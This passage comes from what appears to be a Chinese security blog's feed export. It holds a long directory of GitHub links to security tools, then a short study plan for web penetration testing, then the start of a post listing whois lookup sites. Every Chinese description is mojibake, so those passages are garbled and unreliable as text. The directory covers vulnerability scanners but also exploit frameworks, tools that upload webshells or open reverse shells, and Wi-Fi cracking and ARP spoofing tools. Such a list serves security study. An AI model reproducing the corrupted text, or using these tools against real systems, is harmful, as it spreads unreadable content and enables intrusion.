href="https://github.com/boy-hack/w11scan">https://github.com/boy-hack/w11scan</a><br>(åˆ†å¸ƒå¼WEBæŒ‡çº¹è¯†åˆ«å¹³å°)<br><a href="https://github.com/Nekmo/dirhunt">https://github.com/Nekmo/dirhunt</a><br>(çˆ¬è™«å¼webç›®å½•æ‰«æå·¥å…·)<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a><br>(Jenkinsæ¼æ´æ¢æµ‹ï¼Œç”¨æˆ·æŠ“å–çˆ†ç ´)<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>(é¦–æ¬¾é›†æˆåŒ–çš„Discuzæ‰«æå·¥å…·)<br><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a><br>(ä¸€æ¬¾ç®€æ´ä¼˜é›…çš„CMSæ‰«æåˆ©ç”¨æ¡†æ¶)<br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a><br>(IISçŸ­æ–‡ä»¶åæš´åŠ›æšä¸¾æ¼æ´åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a><br>(flashxssæ‰«æ)<br><a href="https://github.com/coffeehb/SSTIF">https://github.com/coffeehb/SSTIF</a><br>(ä¸€ä¸ªèµ·æ¯›æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„åŠè‡ªåŠ¨åŒ–å·¥å…·)<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>(æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´æ£€æµ‹ä¸åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/cr0hn/dockerscan(Docker%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7)">https://github.com/cr0hn/dockerscan(Dockeræ‰«æå·¥å…·)</a><br><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a><br>(ä¸€æ¬¾ç²¾ç®€çš„wordpressæ‰«æå·¥å…·)<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> (é›†æˆåŒ–wordpressæ¼æ´åˆ©ç”¨æ¡†æ¶)<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a><br>(ç”¨äºæ‰«æJ2EEåº”ç”¨çš„ä¸€æ¬¾burpsuiteæ’ä»¶)<br><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a><br>(ä¸€æ¬¾åŸºäºperlçš„strut2çš„å†å²æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a><br>(æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨åŠæ‰«æå·¥å…·ï¼Œæ”¯æŒåå¼¹shell)<br><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a><br>(åŸºäºSalt Openä»¥åŠVulners Linux Audit APIçš„linuxæ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒä¸JIRAï¼Œslackå¹³å°ç»“åˆä½¿ç”¨)<br><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a><br>(è‡ªåŠ¨åŒ–æ¢æµ‹å®¢æˆ·ç«¯AngularJSæ¨¡æ¿æ³¨å…¥æ¼æ´å·¥å…·)<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br>(Javaç¼–å†™çš„IISçŸ­æ–‡ä»¶åæš´åŠ›æšä¸¾æ¼æ´åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a><br>(åŸºäºWPScanä»¥åŠWPSekuçš„ä¼˜åŒ–ç‰ˆwordpressæ‰«æå™¨)<br><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a><br>(CMSæ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/rudSarkar/crlf-injector">https://github.com/rudSarkar/crlf-injector</a><br>(CRLFæ³¨å…¥æ¼æ´æ‰¹é‡æ‰«æ)<br><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a><br>(è‡ªåŠ¨åŒ–æ‰«æå†…ç½‘ä¸­å­˜åœ¨çš„ç”±å½±å­ç»çºªäººæ³„éœ²çš„ETERNALç³»åˆ—æ¼æ´)<br><a href="https://github.com/utiso/dorkbot">https://github.com/utiso/dorkbot</a><br>(é€šè¿‡å®šåˆ¶åŒ–çš„è°·æ­Œæœç´¢å¼•æ“è¿›è¡Œæ¼æ´é¡µé¢æœå¯»åŠæ‰«æ)<br><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a><br>(æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨åŠæ‰«æå·¥å…·ï¼Œæ”¯æŒåå¼¹shell)<br><a href="https://github.com/mak-/parameth">https://github.com/mak-/parameth</a><br>(ç”¨äºæšä¸¾è„šæœ¬çš„GET / POSTæœªçŸ¥å‚æ•°å­—æ®µ)<br><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a><br>(struts2çš„æ¼æ´å…¨ç‰ˆæœ¬æ£€æµ‹å’Œåˆ©ç”¨å·¥å…·)<br><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a><br>(SSLæ¼æ´æ‰«æï¼Œä¾‹å¦‚å¿ƒè„æ»´è¡€æ¼æ´ç­‰)<br><a href="https://github.com/NullArray/DorkNet">https://github.com/NullArray/DorkNet</a><br>(åŸºäºæœç´¢å¼•æ“çš„æ¼æ´ç½‘é¡µæœå¯»)<br><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a><br>(ç”¨äºæ”»å‡»çˆ†ç ´Java RemoteMethod InvocationæœåŠ¡çš„å·¥å…·)<br><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a><br>(æ‰«æjsæ‰©å±•åº“çš„å¸¸è§æ¼æ´)<br><a href="https://github.com/kotobukki/BDA">https://github.com/kotobukki/BDA</a><br>(é’ˆå¯¹çš„hadoop /ç«èŠ±ç­‰å¤§æ•°æ®å¹³å°çš„çš„æ¼æ´æ¢æµ‹å·¥å…·)<br><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a><br>(RegExæ‹’ç»æœåŠ¡æ‰«æå™¨)<br><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a><br>(ä½¿ç”¨NMAPæ‰«æçš„Torç½‘ç»œä¸Šéšè—çš„â€œæ´‹è‘±â€æœåŠ¡)<br><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a><br>(Web CMS Exploitå·¥å…·ï¼ŒåŒ…å«é’ˆå¯¹ä¸»æµCMSçš„66ä¸ªä¸åŒçš„æ¼æ´åˆ©ç”¨)<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>(ä¸€ä¸ªè¿·ä½ çš„ä¿¡æ¯æ³„æ¼æ‰¹é‡æ‰«æè„šæœ¬)<br><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a><br>(æ–‡ä»¶ä¸Šä¼ æ¼æ´æ‰«æå™¨åŠåˆ©ç”¨å·¥å…·)<br><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a><br>(å­åŸŸåæ¥ç®¡æ¼æ´æ£€æµ‹å·¥å…·ï¼Œæ”¯æŒ30+äº‘æœåŠ¡æ‰˜ç®¡æ£€æµ‹)<br><a href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a><br>(WordPressçš„æ¼æ´æ‰«æå™¨ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒæ•æ„Ÿæ–‡ä»¶æ³„éœ²æ‰«æ)<br><a href="https://github.com/retirejs/retire.js">https://github.com/retirejs/retire.js</a><br>(æ£€æµ‹ç½‘ç«™ä¾èµ–çš„JavaScriptåº“ä¸­å­˜åœ¨çš„å·²çŸ¥é€šç”¨æ¼æ´)<br><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a><br>(è‡ªåŠ¨æ£€æµ‹ä¸Šä¼ åŠŸèƒ½æ˜¯å¦å¯ä¸Šä¼ webshell)<br><a href="https://github.com/mobrine-mob/M0B-tool">https://github.com/mobrine-mob/M0B-tool</a><br>(CMSæŒ‡çº¹è¯†åˆ«åŠè‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/rezasp/vbscan">https://github.com/rezasp/vbscan</a><br>(è®ºå›æ¡†æ¶vBulletiné»‘ç›’æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/MrSqar-Ye/BadMod">https://github.com/MrSqar-Ye/BadMod</a><br>(CMSæŒ‡çº¹è¯†åˆ«åŠè‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a><br>(CMSæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨å¥—ä»¶)<br><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a><br>(AWSå®‰å…¨å®¡è®¡å·¥å…·)<br><a href="https://github.com/radenvodka/SVScanner">https://github.com/radenvodka/SVScanner</a><br>(é’ˆå¯¹wpï¼Œmagentoï¼Œjoomlaç­‰CMSçš„æ¼æ´æ‰«æå™¨åŠè‡ªåŠ¨åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/rezasp/joomscan">https://github.com/rezasp/joomscan</a><br>(OWASPæ——ä¸‹joomlaæ¼æ´æ‰«æé¡¹ç›®)<br><a href="https://github.com/6IX7ine/djangohunter">https://github.com/6IX7ine/djangohunter</a><br>(ç”¨äºæ£€æµ‹å› é”™è¯¯é…ç½®å¯¼è‡´æ•æ„Ÿä¿¡æ¯æš´éœ²çš„Djangoåº”ç”¨ç¨‹åº)<br><a href="https://github.com/savio-code/fern-wifi-cracker/">https://github.com/savio-code/fern-wifi-cracker/</a><br>(æ— çº¿å®‰å…¨å®¡è®¡å·¥å…·)<br><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a><br>(Pythonç½‘ç»œ/æ¸—é€æµ‹è¯•å·¥å…·)<br><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a><br>(æ— çº¿å®‰å…¨æ¸—é€æµ‹è¯•å¥—ä»¶)<br><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a><br>(æ— çº¿ç½‘ç»œå®¡è®¡å·¥å…·ï¼Œæ”¯æŒ2-5GHZé¢‘æ®µ)<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>(ARPæ¬ºéª—ï¼Œæ— çº¿ç½‘ç»œåŠ«æŒ)<br><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a><br>(æ£€æŸ¥wifiæ˜¯å¦æ˜¯â€œå¤§è èâ€æ‰€å¼€æ”¾çš„çƒ­ç‚¹ï¼Œå¹¶ç»™äºˆç½‘ç»œè¯„åˆ†)<br><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a><br>(è‡ªåŠ¨åŒ–æ— çº¿ç½‘ç»œæ”»å‡»å·¥å…·wifiteçš„é‡æ„ç‰ˆæœ¬)<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>(åŸºäºBBScan via.lijiejieçš„æœ¬åœ°ç½‘ç»œæ‰«æ)<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>(åŸºäºJavaScriptçš„çš„æœ¬åœ°ç½‘ç»œæ‰«æ)<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>(ç™½ç›’ä»£ç å®‰å…¨å®¡è®¡ç³»ç»Ÿ)<br><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a><br>(é™æ€PHPä»£ç å®¡è®¡)<br><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a><br>(è·Ÿè¸ªï¼Œåˆ†æPHPè¿è¡Œæƒ…å†µçš„å·¥å…·)<br><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a><br>(çš„NodeJSåº”ç”¨ä»£ç å®¡è®¡)<br><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a><br>(Pythonåº”ç”¨å®¡è®¡)<br><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a><br>(Ruby on Railsåº”ç”¨é™æ€ä»£ç åˆ†æ)<br><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a><br>(Pythonåº”ç”¨é™æ€ä»£ç å®¡è®¡)<br><a href="https://github.com/m4ll0k/WPSploit">https://github.com/m4ll0k/WPSploit</a><br>(WordPressæ’ä»¶ä»£ç å®‰å…¨å®¡è®¡)<br><a href="https://github.com/emanuil/php-reaper">https://github.com/emanuil/php-reaper</a><br>(ç”¨äºæ‰«æPHPåº”ç”¨ç¨‹åºä¸­å¯èƒ½å­˜åœ¨SQLæ¼æ´çš„ADOdbä»£ç )<br><a href="https://github.com/lowjoel/phortress">https://github.com/lowjoel/phortress</a><br>(ç”¨äºæ£€æµ‹æ½œåœ¨å®‰å…¨æ¼æ´çš„PHPé™æ€ä»£ç åˆ†æå·¥å…·)<br><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a><br>(è‡ªåŠ¨æ¼æ´æ‰«æå™¨ï¼Œå­åŸŸåçˆ†ç ´ï¼Œç«¯å£æ‰«æï¼Œç›®å½•çˆ†ç ´ï¼Œå¸¸ç”¨æ¡†æ¶æ¼æ´æ£€æµ‹)<br><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a><br>(é›†åˆowasp top10æ¼æ´æ‰«æå’Œè¾¹ç•Œèµ„äº§å‘ç°èƒ½åŠ›çš„åˆ†å¸ƒå¼webæ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a><br>(BkScanneråˆ†å¸ƒå¼ï¼Œæ’ä»¶åŒ–webæ¼æ´æ‰«æå™¨)<br><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a><br>(ysrcå‡ºå“çš„è¢«åŠ¨å¼æ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a><br>(åŸºäºhttpä»£ç†çš„webæ¼æ´æ‰«æå™¨)<br><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a><br>(è‡ªåŠ¨åŒ–æ‰«æå™¨ï¼ŒåŒ…æ‹¬ä¸­é—´ä»¶æ‰«æä»¥åŠè®¾å¤‡æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a><br>(å®šå‘å…¨è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•å·¥å…·)<br><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a><br>(è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œæ”¯æŒcdnçœŸå®ipæŸ¥æ‰¾ï¼ŒæŒ‡çº¹è¯†åˆ«ç­‰)<br><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a><br>(èŸ’æ’ä»¶åŒ–æ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒç”Ÿæˆæ‰«ææŠ¥è¡¨)<br><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a><br>(æ¸—é€æµ‹è¯•æ’ä»¶åŒ–å¹¶å‘æ¡†æ¶)<br><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a><br>(æ”¯æŒæ£€æµ‹SQLI/ XSS / LFI / RFIç­‰æ¼æ´çš„æ‰«æå™¨)<br><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a><br>(Webå›¾å½¢åŒ–çš„æ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a><br>(ä¸€æ¬¾ç½‘ç»œåŒ–çš„è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a><br>(ä¸€æ¬¾é›†æˆä¿¡æ¯æ”¶é›†ï¼Œæ¼æ´æ‰«æï¼ŒæŒ‡çº¹è¯†åˆ«ç­‰çš„å¤šåˆä¸€æ‰«æå·¥å…·)<br><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a><br>(é«˜åº¦é›†æˆåŒ–çš„Webåº”ç”¨æ¼æ´æ‰«ææ¡†æ¶ï¼Œæ”¯æŒRESTï¼ŒRPCç­‰apiè°ƒç”¨)<br><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a><br>(é›†æˆåŒ–æ¸—é€æµ‹è¯•è¾…åŠ©å¹³å°åŠæ¼æ´ç®¡ç†å¹³å°)<br><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a><br>(æ¸—é€æµ‹è¯•é›†æˆæ¡†æ¶ï¼ŒåŒ…å«è¶…è¿‡38,000+æ”»å‡»)<br><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a><br>(åŸºäºé“¬/æ­Œå‰§æ’ä»¶çš„è¢«åŠ¨å¼æ¼æ´æ‰«æ)<br><a href="https://github.com/anilbaranyelken/tulpar">https://github.com/anilbaranyelken/tulpar</a><br>(æ”¯æŒå¤šç§ç½‘ç»œæ¼æ´æ‰«æï¼Œå‘½ä»¤è¡Œç¯å¢ƒä½¿ç”¨)<br><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a><br>(webåº”ç”¨æ‰«æå™¨ï¼Œæ”¯æŒæŒ‡çº¹è¯†åˆ«ï¼Œæ–‡ä»¶ç›®å½•çˆ†ç ´ï¼ŒSQL / XSS / RFIç­‰æ¼æ´æ‰«æï¼Œä¹Ÿå¯ç›´æ¥ç”¨äºstrutsï¼ŒShellShockç­‰æ‰«æ)<br><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a><br>(é›†æˆå­åŸŸåæšä¸¾ï¼Œnmapï¼ŒwafæŒ‡çº¹è¯†åˆ«ç­‰æ¨¡å—çš„webåº”ç”¨æ‰«æå™¨)<br><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a><br>(ä½¿ç”¨rubyå¼€å‘çš„æ‰«æç½‘ç»œä¸­ä¸»æœºå­˜åœ¨çš„ç¬¬ä¸‰æ–¹webåº”ç”¨æœåŠ¡æ¼æ´)<br><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a><br>(Webåº”ç”¨è‡ªåŠ¨åŒ–æ‰«ææ¡†æ¶ï¼Œæ”¯æŒè‡ªåŠ¨åŒ–ä¸Šä¼ webshell)<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>(ä¸€æ¬¾å¼€æºPocè°ƒç”¨æ¡†æ¶ï¼Œå¯è½»æ¾è°ƒç”¨Pocsuiteï¼ŒTangscanï¼ŒBeebeetoï¼ŒKnowsecè€ç‰ˆæœ¬POCï¼Œå¯ä½¿ç”¨dockeréƒ¨ç½²)<br><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a><br>(æ–—è±¡èƒ½åŠ›ä¸­å¿ƒå‡ºå“å¹¶é•¿æœŸç»´æŠ¤çš„å¼€æºæ¼æ´æ£€æµ‹æ¡†æ¶)<br><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a><br>(Webåº”ç”¨æ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a><br>(Webåº”ç”¨æ¼æ´æ‰«ææ¡†æ¶ï¼ŒåŸºäºpython3)<br><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a><br>(è¢«åŠ¨å¼æ¼æ´æ‰«æï¼Œæ”¯æŒå†å²cveç¼–å·æ¼æ´è¯†åˆ«)<br><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a><br>(OWASP ZAPæ ¸å¿ƒé¡¹ç›®å‡ºå“çš„ç»¼åˆæ€§æ¸—é€æµ‹è¯•å·¥å…·)<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>(WebæœåŠ¡ç»¼åˆå‹æ‰«æå™¨ï¼Œç”¨äºæŒ‡å®šç›®æ ‡çš„èµ„äº§æ”¶é›†ï¼Œå®‰å…¨é…ç½®ç¼ºé™·æˆ–è€…å®‰å…¨æ¼æ´æ‰«æ)<br><a href="https://github.com/s0md3v/Striker">https://github.com/s0md3v/Striker</a><br>(ä¸€æ¬¾å¤šæ–¹ä½ä¿¡æ¯æ”¶é›†ï¼ŒæŒ‡çº¹è¯†åˆ«åŠæ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a><br>(ä¸€æ¬¾webåº”ç”¨æ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒæ‰«æåå°„å‹ä»¥åŠå­˜å‚¨å‹xssï¼Œsql injectionç­‰æ¼æ´ï¼Œæ”¯æŒè¾“å‡ºpdfæŠ¥å‘Š)<br><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a><br>(æ¸—é€æµ‹è¯•è¾…åŠ©å·¥å…·ï¼Œç»¼åˆåˆ©ç”¨æ¡†æ¶)<br><a href="https://github.com/toyakula/luna">https://github.com/toyakula/luna</a><br>(åŸºäºè¢«åŠ¨å¼æ‰«ææ¡†æ¶çš„è‡ªåŠ¨åŒ–webæ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a><br>(æ¸—é€æµ‹è¯•è¾…åŠ©æ¡†æ¶ï¼ŒåŒ…å«ä¿¡æ¯æœé›†ï¼Œæ— çº¿æ¸—é€ï¼Œç½‘ç»œåº”ç”¨æ‰«æç­‰åŠŸèƒ½)<br><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a><br>(å†…ç½®1200+æ’ä»¶çš„webæ¼æ´æ‰«ææ¡†æ¶)<br><a href="https://github.com/YalcinYolalan/WSSAT">https://github.com/YalcinYolalan/WSSAT</a><br>(WebæœåŠ¡å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œæä¾›åŸºäºwindowsæ“ä½œç³»ç»Ÿçš„ç®€å•.exeåº”ç”¨)<br><a href="https://github.com/AmyangXYZ/AssassinGo">https://github.com/AmyangXYZ/AssassinGo</a><br>(ä½¿ç”¨å»å¼€å‘çš„å¯æ‰©å±•ä»¥åŠé«˜å¹¶å‘æ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/jeffzh3ng/InsectsAwake">https://github.com/jeffzh3ng/InsectsAwake</a><br>(åŸºäºFlaskåº”ç”¨æ¡†æ¶çš„æ¼æ´æ‰«æç³»ç»Ÿ)<br><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a><br>(ä¸€ä¸ªæ“ä½œä¸Šç±»ä¼¼metasploitçš„webåº”ç”¨å®‰å…¨å®¡è®¡æ¡†æ¶)<br><a href="https://github.com/joker25000/Optiva-Framework">https://github.com/joker25000/Optiva-Framework</a><br>(ä¸€æ¬¾webåº”ç”¨æ¼æ´æ‰«æå™¨ï¼Œæ”¯æŒæ‰«æåå°„å‹ä»¥åŠå­˜å‚¨å‹xssï¼Œsql injectionç­‰æ¼æ´)<br><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a><br>(é›†æˆ104ä¸ªæ¨¡å—çš„Webåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ¡†æ¶)<br><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a><br>(ä¸€æ¬¾APTå…¥ä¾µç—•è¿¹æ‰«æå™¨)<br><a href="https://github.com/w3h/icsmaster/tree/master/nse">https://github.com/w3h/icsmaster/tree/master/nse</a><br>(ICSè®¾å¤‡nmapæ‰«æè„šæœ¬)<br><a href="https://github.com/OpenNetworkingFoundation/DELTA">https://github.com/OpenNetworkingFoundation/DELTA</a><br>(SDNå®‰å…¨è¯„ä¼°æ¡†æ¶)</p>
]]></content>
      <categories>
        <category>å·¥å…·æ‰‹å†Œ</category>
      </categories>
      <tags>
        <tag>å·¥å…·æ‰‹å†Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸ªäººè§„åˆ’</title>
    <url>/posts/d7c4f825/</url>
    <content><![CDATA[<p>æœ€è¿‘ä¸€ç›´åœ¨è€ƒç ”å’Œå°±ä¸šä¸Šæœ‰æ‰€çŠ¹è±«ï¼Œè¿™ä¸¤å¤©å›å®¶å‘†äº†å‡ å¤©ï¼Œä»”ç»†æƒ³äº†æƒ³ï¼Œæœ€ç»ˆè¿˜æ˜¯å†³å®šé€‰æ‹©å°±ä¸šï¼Œä¸å»è€ƒç ”äº†ã€‚åœ¨è¿™åŠå¹´ä¸­ï¼Œè¦å¥½å¥½å‡†å¤‡ï¼Œç­‰æš‘å‡æˆ–è€…å¼€å­¦åå»å¤–é¢å®ä¹ ã€‚åœ¨è¿™æœŸé—´ï¼Œè¦å¥½å¥½å­¦ä¹ ä»¥ä¸‹ä¸€äº›çŸ¥è¯†ã€‚ä¹‹å‰hvvé¢è¯•äº†å››æ¬¡ï¼Œé¢è¯•å‰ä¹Ÿæ²¡å†æ¥è§¦è¿™äº›å…‘ç°ï¼Œå†å­¦ä¹ é«˜æ•°è‹±è¯­å•¥çš„ï¼Œç°åœ¨åšå¥½å†³å®šäº†ï¼Œé‚£å°±è®¤çœŸå‡†å¤‡å§~</p>
<p>åšå®¢ä¹Ÿä¼šå³ä½¿æ›´æ–°ï¼Œå¸Œæœ›æ¯å¤©éƒ½å¯ä»¥å­¦åˆ°å†™ä¸œè¥¿å§ã€‚</p>
<br>

<ul>
<li>åŸºç¡€æ¼æ´åŸç†åŠåˆ©ç”¨</li>
</ul>
<ol>
<li>xss</li>
<li>sqlæ³¨å…¥</li>
<li>ssrf</li>
<li>csrf</li>
<li>XXE</li>
<li>ååºåˆ—åŒ–</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>é€»è¾‘æ¼æ´</li>
<li>â€¦ ï¼ˆæœ‰å¾…è¡¥å……ï¼‰</li>
</ol>
<ul>
<li>å·¥å…·ä½¿ç”¨</li>
</ul>
<ol>
<li>burp suite åŠæ’ä»¶</li>
<li>sqlmap</li>
<li>nmap</li>
<li>msf</li>
<li>xray</li>
<li>fuzzscan</li>
<li>Goby </li>
<li>â€¦. ï¼ˆæœ‰å¾…è¡¥å……ï¼‰</li>
</ol>
<ul>
<li>è„šæœ¬ç¼–å†™</li>
</ul>
<ol>
<li>æ‰¹é‡payload</li>
<li>scan</li>
</ol>
<ul>
<li>æ¼æ´å¤ç°</li>
</ul>
<ol>
<li>vulhub</li>
<li>dwva</li>
<li>sqli</li>
<li>zkaq</li>
<li>â€¦   (æœ‰å¾…è¡¥å……)</li>
</ol>
<ul>
<li>ç½‘ç»œåè®®</li>
</ul>
<ol>
<li>TCP/IP</li>
<li>UDP</li>
<li>ä¸‰æ¬¡æ¡æ‰‹</li>
<li>â€¦   ï¼ˆæœ‰å¾…è¡¥å……ï¼‰</li>
</ol>
<ul>
<li>å†…ç½‘å®‰å…¨</li>
<li>APPæ¸—é€</li>
</ul>
]]></content>
      <categories>
        <category>è§„åˆ’</category>
      </categories>
      <tags>
        <tag>è§„åˆ’</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ”¶é›†</title>
    <url>/posts/312e3d12/</url>
    <content><![CDATA[<h2 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h2><h3 id="webæ¥å£æŸ¥è¯¢"><a href="#webæ¥å£æŸ¥è¯¢" class="headerlink" title="webæ¥å£æŸ¥è¯¢:"></a>webæ¥å£æŸ¥è¯¢:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
